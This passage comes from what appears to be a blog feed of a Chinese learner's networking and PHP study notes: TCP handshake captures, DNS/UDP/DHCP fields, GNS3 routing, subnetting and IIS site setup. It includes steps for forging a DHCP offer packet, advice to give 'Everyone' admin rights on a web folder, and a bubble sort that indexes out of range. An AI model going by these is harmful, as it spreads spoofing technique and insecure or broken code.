($a*$a*$a)+($b*$b*$b)+($c*$c*$c);</span></span><br><span class="line"><span class="variable">$result</span> = pow(<span class="variable">$a</span>,<span class="number">3</span>)+pow(<span class="variable">$b</span>,<span class="number">3</span>)+pow(<span class="variable">$c</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//$result = pow($a,3);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> == <span class="variable">$i</span>){</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>九九乘法表-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span> &lt;= <span class="number">9</span>; <span class="variable">$i</span>++) {</span><br><span class="line"><span class="comment">//echo $i;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">1</span>;<span class="variable">$j</span>&lt;=<span class="variable">$i</span>;<span class="variable">$j</span>++){</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$j</span> .<span class="string">'x'</span> . <span class="variable">$i</span> . <span class="string">'='</span> . (<span class="variable">$j</span>*<span class="variable">$i</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;td&gt; &lt;/td&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>冒泡排序-php-for</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//冒泡排序</span></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">array</span>(<span class="number">5</span>,<span class="number">21</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">44</span>,<span class="number">35</span>,<span class="number">57</span>,<span class="number">48</span>,<span class="number">66</span>,<span class="number">55</span>,<span class="number">81</span>,<span class="number">72</span>,<span class="number">100</span>,<span class="number">95</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$r</span>)-<span class="number">1</span>;<span class="variable">$i</span>++){</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;count(<span class="variable">$r</span>)-<span class="number">1</span>-<span class="variable">$i</span>;<span class="variable">$a</span>++){</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$r</span>[<span class="variable">$a</span>]&lt;<span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>]){</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$r</span>[<span class="variable">$a</span>];</span><br><span class="line">    <span class="variable">$r</span>[<span class="variable">$a</span>] = <span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$r</span>[<span class="variable">$a</span>-<span class="number">1</span>] = <span class="variable">$result</span>;</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line">var_dump(<span class="variable">$r</span>);</span><br><span class="line"><span class="comment">//echo $r;  //echo无法输出array</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;pre&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;水仙花数-1&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;lin</summary>
      
    
    
    
    
    <category term="javascript" scheme="http://aisibuhuipao.github.io/tags/javascript/"/>
    
    <category term="水仙花数" scheme="http://aisibuhuipao.github.io/tags/%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/"/>
    
    <category term="九九乘法表" scheme="http://aisibuhuipao.github.io/tags/%E4%B9%9D%E4%B9%9D%E4%B9%98%E6%B3%95%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>win-dos-思维导图</title>
    <link href="http://aisibuhuipao.github.io/2021/12/27/win-dos-%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    <id>http://aisibuhuipao.github.io/2021/12/27/win-dos-%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/</id>
    <published>2021-12-27T01:09:37.000Z</published>
    <updated>2021-12-27T01:09:37.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/win%20dos%20%E6%80%9D%E7%BB%B4%E8%84%91%E5%9B%BE.png" alt="win dos 思维脑图"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/img/main/win%20dos%20%E6%80%9D%E7%BB%B4%E8%84%91%E5%9B%BE.png&quot; alt=&quot;win dos 思维脑图</summary>
      
    
    
    
    
    <category term="思维脑图" scheme="http://aisibuhuipao.github.io/tags/%E6%80%9D%E7%BB%B4%E8%84%91%E5%9B%BE/"/>
    
    <category term="windows" scheme="http://aisibuhuipao.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>HTML，Js和CSS</title>
    <link href="http://aisibuhuipao.github.io/2021/12/26/HTML%EF%BC%8CJs%E5%92%8CCSS/"/>
    <id>http://aisibuhuipao.github.io/2021/12/26/HTML%EF%BC%8CJs%E5%92%8CCSS/</id>
    <published>2021-12-26T04:06:51.000Z</published>
    <updated>2021-12-26T04:06:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>  一、HTML 超文本标记语言（Hyper Text Markup Language）</p><p>​            HTML是标记语言，不是编程语言</p><p>​                工具自动生成</p><p>​            <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211226121618835.png" alt="image-20211226121618835"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211226121847653.png" alt="image-20211226121847653"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  一、HTML 超文本标记语言（Hyper Text Markup Language）&lt;/p&gt;
&lt;p&gt;​            HTML是标记语言，不是编程语言&lt;/p&gt;
&lt;p&gt;​                工具自动生成&lt;/p&gt;
&lt;p&gt;​            &lt;img</summary>
      
    
    
    
    
    <category term="HTML" scheme="http://aisibuhuipao.github.io/tags/HTML/"/>
    
    <category term="JavaScript" scheme="http://aisibuhuipao.github.io/tags/JavaScript/"/>
    
    <category term="CSS" scheme="http://aisibuhuipao.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>TCP握手与挥手</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/TCP%E6%8F%A1%E6%89%8B%E4%B8%8E%E6%8C%A5%E6%89%8B/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/TCP%E6%8F%A1%E6%89%8B%E4%B8%8E%E6%8C%A5%E6%89%8B/</id>
    <published>2021-12-25T14:48:18.000Z</published>
    <updated>2021-12-25T14:48:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>nc -lvnp 8080                        nc 127.0.0.1 8080</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232618476.png" alt="image-20211225232618476"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232639421.png" alt="image-20211225232639421"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225232653750.png" alt="image-20211225232653750"></p><p>curl</p><p>都可以抓包</p><p>一.分析tcp三次握手，四次挥手，和数据包传输过程，并截图分析。 TCP数据段分析</p><p>​    \1.  源端口和目的端口 各占 16位</p><p>​    \2.  序号占 32位</p><p>​    \3.  确认号占 32位</p><p>​    \4.  数据偏移占 4位 即首部长度</p><p>​    \5.  保留位占 6位</p><p>​    \6.  紧急URG占 1位，当为1时，报告此文件中有紧急数据</p><p>​    \7.  确认ACK占 1位，确认有效，否则 (3)：“确认号” 字段无效</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225226141.png" alt="image-20211225225226141"></p><p>​            URG紧急指针（urgent pointer）有效。</p><p>​            ACK表示响应</p><p>​            PSH表示有 DATA数据传输</p><p>​            RST表示连接重置</p><p>​            SYN表示建立连接</p><p>​            FIN表示关闭连接        </p><p>位码即tcp标志位，有6种标示：SYN(synchronous建立联机) ACK(acknowledgement 确认) PSH(push传送) FIN(finish结束) RST(reset重置) URG(urgent紧急)Sequence number(顺序号码) Acknowledge number(确认号码)</p><p>第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</p><p>第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包；</p><p>第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</p><p>完成三次握手，主机A与主机B开始传送数据。</p><p>在TCP/IP协议中，TCP协议提供可靠的连接服务，采用三次握手建立一个连接。<br>第一次握手：建立连接时，客户端发送syn包(syn=j)到服务器，并进入SYN_SEND状态，等待服务器确认；<br>第二次握手：服务器收到syn包，必须确认客户的SYN（ack=j+1），同时自己也发送一个SYN包（syn=k），即SYN+ACK包，此时服务器进入SYN_RECV状态；</p><p>第三次握手：客户端收到服务器的SYN＋ACK包，向服务器发送确认包ACK(ack=k+1)，此包发送完毕，客户端和服务器进入ESTABLISHED状态，完成三次握手。完成三次握手，客户端与服务器开始传送数据.</p><p>打开Wireshark</p><p>​    打开一个网站 <a href="http://www.tianya.cn/">http://www.tianya.cn/</a></p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225307516.png" alt="image-20211225225307516"></p><p>​    第4个包表示HTTP确实使是使用TCP建立连接的</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225325803.png" alt="image-20211225225325803"></p><p>TCP第一次握手</p><p>​    客户端发送一个TCP包，标志位为 SYN，序号为0 表示客户端请求连接</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225341864.png" alt="image-20211225225341864"></p><p>TCP 第二次握手</p><p>​    服务器返回确认包，标志位为 SYN,ACK 将确认序号为 SN(0) +NSN(1) = ACK(1)</p><p>​    <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225400586.png" alt="image-20211225225400586"></p><p>TCP 第三次握手</p><p>客户端确定收到服务器发来的 确认包 1 </p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225414669.png" alt="image-20211225225414669"></p><p>数据链路层 以太网</p><p>属于 目标MAC地址为 58：25：75：a5：2f：a7</p><p>源 MAC 地址为：74：86：7a：56：3c：f9</p><p>类型为 IP 数据包</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225456503.png" alt="image-20211225225456503"></p><p>网络层</p><p>版本为 IPv4</p><p>头部数据长度为 20 字节</p><p>Fragment的偏移量为 0 </p><p>Headr Checksum 为头部校验和</p><p>目标IP地址为：124.225.206.22 ，源 IP 地址为：192.168.21.2</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225539744.png" alt="image-20211225225539744"></p><p>传输层</p><p>目标端口为2456 </p><p>源端口为 80</p><p>Acknowledgment Number 为1表示数据包收到，确认有效</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225225553061.png" alt="image-20211225225553061"></p><p>Window表示窗口大小为 516 字节</p><p>TCP握手类似打电话</p><p>​    比如张三给你李四打电话</p><p>​       张三：喂，我是张三，你是李四吗？</p><p>​       李四：我是李四，你能听到吗？</p><p>​       张三：我能听到</p><p>​    至此他们之间建立了连接</p><p>分析4次挥手</p><p><code>curl -v check.amazonaws.com</code></p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225230651274.png" alt="image-20211225230651274" style="zoom: 200%;"><p>\1.  发起关闭的 是 客户端 先发送了一个 FIN, ACK 的FIN,ACK seq=2，ACK=2</p><p>\2.  第二次服务端给 客户端发送 ACK seq=1 ack=3</p><p>\3.  第三次客户端发给服务端 FIN, ACK seq=1 ACK=3</p><p>\4. 第四次客户端发给服务端 FIN, ACK seq=3 ACK=1</p><p>二. DNS</p><p><code>nslookup 网址</code></p><p>整个DNS报文分3部分，基础结构部分，问题部分，资源记录部分</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231045499.png" alt="image-20211225231045499"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231048702.png" alt="image-20211225231048702"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231053777.png" alt="image-20211225231053777"></p><p>1..事务ID（Transaction ID）请求报⽂和其对应的应答报⽂，这个字段的值是相同的。</p><p>\2. 标志(Flags)：DNS 报⽂中的标志字段</p><p>\3. 问题计数（Questions）：DNS 查询请求的数⽬</p><p>\4. 回答资源记录数(Answres RRs)：DNS 响应的数⽬</p><p>\5. 权威名称服务器计数(Authority RRs)：权威名称服务器的数⽬</p><p>\6. 附加资源记录数(Additional)：额外的记录数⽬（权威名称服务器对应 IP 地址的数⽬）</p><p>​    QR(Respons):查询或请求标志信息，查询时：0响应时：1</p><p>​    Opcode：操作码，0表示标志查询，1表示反向查询，2表示服务器状态请求</p><p>​    AA（Authoritative）:授权应答，值为1时表示该服务器是权威的服务器，0表示不是权威服务器</p><p>​    TC（Truncated）:表示是否被截断，1为响应超过512字节并被截断</p><p>​    RD（Recursion Desired）:表示这个字段在一个查询中的设置，并且响应中返回。标志为告诉名称服务器必须处理这个查询，这种方式是一种递归查询，值为0时，且请求的名称服务器没有一个授权回答，将返回一个能解答该查询的其他服务器列表</p><p>​    RA（Recursion Available）:这个字段只出现在响应报文中，为1时表示服务器支持递归查询</p><p>​    Z：保留字段，所有的请求和应答报文中，这个值必须为0</p><p>​    rcode(Reply code)：返回码字段，表示响应的差错状态</p><p>​       为0时：没有错误</p><p>​       为1时：有格式错误</p><p>​       为2时：服务器的原因无法处理这个请求</p><p>​       为3时：名字错误，解析的域名不存在</p><p>​       为4时：域名服务器不支持查询类型</p><p>​       为5时：服务器配置策略拒绝回应</p><p>​       为6-15时 保留值</p><p>三. UDP</p><p><code>ping 网站</code>                //    ping 发出的是 ICMP 包</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231138399.png" alt="image-20211225231138399"></p><p><img src="../img/image-20211225231145250.png" alt="image-20211225231145250"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231156336.png" alt="image-20211225231156336"></p><p>​    UDP 是无连接的，即时发送数据之前不需要建立连接</p><p>​    UDP 最大努力传输，不保证可靠</p><p>​    UDP 面向报文，没有拥塞控制，适合多媒体或游戏通信要求</p><p>​    UDP 支持1对1，1对多，多对1和多对多的通信</p><p>​    UDP 首部开销小</p><p>四. DHCP</p><p>释放IP</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231217203.png" alt="image-20211225231217203"></p><p>获取IP</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231224233.png" alt="image-20211225231224233"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231244528.png" alt="image-20211225231244528"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231248893.png" alt="image-20211225231248893"></p><p>获取IP过程</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231304482.png" alt="image-20211225231304482"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231309188.png" alt="image-20211225231309188"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231315479.png" alt="image-20211225231315479"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231320198.png" alt="image-20211225231320198"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231325853.png" alt="image-20211225231325853"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225231331629.png" alt="image-20211225231331629"></p><p>一个完整的DHCP过程中，ID保持不变</p><p>模拟服务器发送offer 报文的过程需要注意的地方</p><p>​       保证服务器与客户端的连通</p><p>​       准备好一个offer报文，可以自己编辑</p><p>​       使用wireshark抓客户端发的Discover报文时，确定当前客户端随机出的Transaction的ID</p><p>​       更改offer报文中的Transaction ID 与Discover报文中一致</p><p>​       使用发包软件发送offer报文</p><p>地址租期</p><p>DHCP服务器提供的每个IP地址都有相应的租用期，在Offer报文中的IP Address Lease Time中可以看到。地址租期时间过长会导致地址资源长期被占用，租期过短会导致DHCP请求包过多，增加网络负担。还要结合当前使用场景来设置。一般来说，对DHCP客户端数量较大，且断开网络比较频繁的场所，如机场、商铺等，一般把DHCP租期配置较短，这样IP地址能很快被回收。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;nc -lvnp 8080                        nc 127.0.0.1 8080&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/aisibuhuipao/img/main/image-202</summary>
      
    
    
    
    
    <category term="TCP" scheme="http://aisibuhuipao.github.io/tags/TCP/"/>
    
    <category term="UDP" scheme="http://aisibuhuipao.github.io/tags/UDP/"/>
    
    <category term="DHCP" scheme="http://aisibuhuipao.github.io/tags/DHCP/"/>
    
    <category term="DNS" scheme="http://aisibuhuipao.github.io/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>GNS3-分网段</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/GNS3-%E5%88%86%E7%BD%91%E6%AE%B5/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/GNS3-%E5%88%86%E7%BD%91%E6%AE%B5/</id>
    <published>2021-12-25T14:42:51.000Z</published>
    <updated>2021-12-25T14:42:51.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gns3完成两个网段之间的主机互相通信"><a href="#gns3完成两个网段之间的主机互相通信" class="headerlink" title="gns3完成两个网段之间的主机互相通信."></a>gns3完成两个网段之间的主机互相通信.</h1><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225224647100.png" alt="image-20211225224647100"></p><h2 id="文字版"><a href="#文字版" class="headerlink" title="文字版"></a>文字版</h2><p>PC-1: ip 192.168.10.10/24 192.168.10.1</p><p>PC-2:: ip 192.168.10.20/24 192.168.10.1</p><p>PC-4: ip 172.20.30.40/24 172.20.30.1</p><p>PC-3: ip 172.20.30.30/24 172.20.30.1</p><p>PC-5: ip10.10.10.10/16 10.10.0.1</p><p>PC-6: ip 10.10.10.20/16 10.10.0.1</p><p>R-1 : configure terminal</p><p>​     Interface f1/1</p><p>​     Ip address 192.168.10.1 255.255.255.0</p><p>​     no shutdown</p><p>​     exit</p><p>​     interface f1/0</p><p>​     ip address 172.20.30.1 255.255.255.0</p><p>​     no sh</p><p>​     exit</p><p>​     interface f0/0</p><p>​     ip address 10.200.10.30 255.255.255.0</p><p>​     no sh</p><p>​     exit</p><p>​     ip route 10.10.0.0 255.255.0.0 10.200.10.10</p><p>​     exit</p><p>R-2: confeigure terminal</p><p>​    Interface f1/0</p><p>​    Ip address 10.10.0.1 255.255.0.0</p><p>​    no sh</p><p>​    exit</p><p>​    interface f0/0</p><p>​    ip address 10.200.10.10 255.255.255.0</p><p>​    no sh</p><p>​    exit</p><p>​    ip route 192.168.10.0 255.255.255.0 10.200.10.30</p><p>​    exit</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;gns3完成两个网段之间的主机互相通信&quot;&gt;&lt;a href=&quot;#gns3完成两个网段之间的主机互相通信&quot; class=&quot;headerlink&quot; title=&quot;gns3完成两个网段之间的主机互相通信.&quot;&gt;&lt;/a&gt;gns3完成两个网段之间的主机互相通信.&lt;/h1&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="Gns3" scheme="http://aisibuhuipao.github.io/tags/Gns3/"/>
    
  </entry>
  
  <entry>
    <title>子网划分</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</id>
    <published>2021-12-25T14:33:40.000Z</published>
    <updated>2021-12-25T14:33:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>为什么进行子网划分<br>减少网络流量，无论什么样的流量，我们都希望它少些，网络流量亦如此。如果没有可信赖的路由器，网络流量可能导致整个网络停顿，但有了路由器后，大部分流量都将呆在本地网络内，只有前往其他网络的分组将穿越路由器。路由器增加广播域，广播域越多，每个广播轻松划分子网域就越小，而每个网段的网络流量也越少。</p><p>优化网络性能，这是减少网络流量的结果。</p><p>简化管理，与庞大的网络相比，在一系列相连的小网络中找出并隔离网络问题更容易。</p><p>有助于覆盖大型地理区域，WAN链路比LAN链路的速度慢得多，且更昂贵;单个大跨度的大型网络在前面说的各个方面都可能出现问题，而将多个小网络连接起来可提高系统的效率。<br>明确需求<br>我们创建子网的时候，一定是根据一定的要求创建的，这个要求就是我们实际的网络需求。一般我们按如下步骤来明确我们的网络需求：</p><p>子网简单算法</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223656140.png" alt="image-20211225223656140"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223709974.png" alt="image-20211225223709974"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223720591.png" alt="image-20211225223720591"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223736105.png" alt="image-20211225223736105"></p><p>我还不会算二进制 - __-!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;为什么进行子网划分&lt;br&gt;减少网络流量，无论什么样的流量，我们都希望它少些，网络流量亦如此。如果没有可信赖的路由器，网络流量可能导致整个网络停顿，但有了路由器后，大部分流量都将呆在本地网络内，只有前往其他网络的分组将穿越路由器。路由器增加广播域，广播域越多，每个广播轻松划分</summary>
      
    
    
    
    
    <category term="子网" scheme="http://aisibuhuipao.github.io/tags/%E5%AD%90%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>GNS-3安装</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/GNS-3/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/GNS-3/</id>
    <published>2021-12-25T14:24:11.000Z</published>
    <updated>2021-12-25T14:24:11.000Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>双击开始安装</p><p> <img src="https://s2.loli.net/2021/12/25/x9sQYlWJXOUIDyi.png" alt="image-20211225222509907"></p></li></ol><p>​    2.这里红框内的选项是必选的，其他的可以不选，也可以都勾选，都勾选的话，安装的时候会下载，会很慢，然后点 Next</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222759779.png" alt="image-20211225222759779"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222811158.png" alt="image-20211225222811158"></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222821864.png" alt="image-20211225222821864"></p><p>​    3.刚刚组件哪里勾选了 GNS3 VM 就会出现红框内容，然后 next</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222840094.png" alt="image-20211225222840094"></p><p>​    4.安装到这里的时候需要注意一下</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225222923651.png" alt="image-20211225222923651"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223006828.png" alt="image-20211225223006828"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223015049.png" alt="image-20211225223015049"></p><p>​    5.完成安装后，打开软件会有初始配置</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223037740.png" alt="image-20211225223037740"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223047503.png" alt="image-20211225223047503"></p><p>​        这里表示连接成功了</p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223111024.png" alt="image-20211225223111024"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223122610.png" alt="image-20211225223122610"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223129823.png" alt="image-20211225223129823"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223139049.png" alt="image-20211225223139049"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223148148.png" alt="image-20211225223148148"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223201070.png" alt="image-20211225223201070"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223214908.png" alt="image-20211225223214908"></p><p>​        <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/image-20211225223221273.png" alt="image-20211225223221273"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;双击开始安装&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://s2.loli.net/2021/12/25/x9sQYlWJXOUIDyi.png&quot; alt=&quot;image-20211225222509907&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;​</summary>
      
    
    
    
    
    <category term="Gns3" scheme="http://aisibuhuipao.github.io/tags/Gns3/"/>
    
  </entry>
  
  <entry>
    <title>win服务器搭建网站</title>
    <link href="http://aisibuhuipao.github.io/2021/12/25/win%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/"/>
    <id>http://aisibuhuipao.github.io/2021/12/25/win%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99/</id>
    <published>2021-12-25T13:54:10.000Z</published>
    <updated>2021-12-25T13:54:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>1.在<a href="https://down.chinaz.com/soft/29129.htm%E4%B8%8B%E8%BD%BD%E6%A0%A1%E6%97%A0%E5%BF%A7%E6%95%99%E5%B8%88%E8%AF%84%E4%BB%B7%E7%B3%BB%E7%BB%9F%E6%BA%90%E7%A0%81">https://down.chinaz.com/soft/29129.htm下载校无忧教师评价系统源码</a></p><p><img src="https://s2.loli.net/2021/12/25/t56m3iqjYDZGbse.png" alt="image-20211225215610047"></p><p><img src="https://s2.loli.net/2021/12/25/pSotXOTAfz3QWHI.png" alt="image-20211225215649656"></p><p><img src="https://s2.loli.net/2021/12/25/R8Y5CX31PLDfgQ6.png" alt="image-20211225215715030"></p><p><img src="https://s2.loli.net/2021/12/25/sVAPZBCqeorUOxf.png" alt="image-20211225220107518"></p><p><img src="https://s2.loli.net/2021/12/25/1m9sAzM8LfH2JG7.png" alt="image-20211225220142873"></p><p>至此就算是成功了，接下来，安装一个自己下的网站源码试试</p><p><img src="https://s2.loli.net/2021/12/25/jRqQcCiY7yHhLVt.png" alt="image-20211225220242402"></p><p><img src="https://s2.loli.net/2021/12/25/JyfhXmdOx6n73bC.png" alt="image-20211225220302892"></p><p><img src="https://s2.loli.net/2021/12/25/slBnRvty1XhdZug.png" alt="image-20211225220314980"></p><p><img src="https://s2.loli.net/2021/12/25/7uKLJEOfM9SNFVp.png" alt="image-20211225220340668"></p><p>这里新建的是网站源码的起始文件，在网站根目录下</p><p><img src="../../../img/image-20211225220708845.png" alt="image-20211225220708845"></p><p><img src="../../../img/image-20211225220729622.png" alt="image-20211225220729622"></p><p><img src="../../../img/image-20211225220743198.png" alt="image-20211225220743198"></p><p><img src="../../../img/image-20211225220751314.png" alt="image-20211225220751314"></p><p>如果发现没有打不开网站，可能端口被占用，可以在应用程序池里将占用端口的服务停止</p><p>或者可能是没有文件权限，在网站根目录下，右键网站文件夹，将IIS或者Every one 加入到管理员权限组里面</p><p>2.修改数据库</p><p>​    将网站的 access 数据库迁入 mysql 数据库中</p><p><img src="https://s2.loli.net/2021/12/25/CpzAjOeg3YkJFsu.png" alt="image-20211225221721119"></p><p><img 